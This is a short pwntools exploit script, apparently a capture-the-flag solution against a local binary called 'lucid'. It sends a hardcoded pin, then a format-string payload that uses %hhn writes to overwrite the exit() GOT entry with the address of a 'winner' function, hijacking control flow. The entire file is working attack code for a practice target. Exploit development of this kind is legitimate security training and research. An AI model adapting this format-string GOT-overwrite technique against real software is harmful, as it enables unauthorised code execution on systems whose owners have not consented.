from pwn import *

context.log_level = 'debug'

exit_got = 0x0804c018
winner = 0x080491f6

#r = remote("127.0.0.1", 5661)

r = process("./lucid")

r.recvuntil(b'Enter the pin: ')
r.send(b'734694122449\n') # Output from reverse.py
r.recvuntil(b'Enter your name: ')

payload = p32(exit_got + 1)
payload += p32(exit_got)
payload += "%{}c%7$hhn".format((0x91 - 8)).encode()
payload += "%{}c%8$hhn".format((0xf6 - 0x91)).encode()

r.sendline(payload)
print(r.recv())
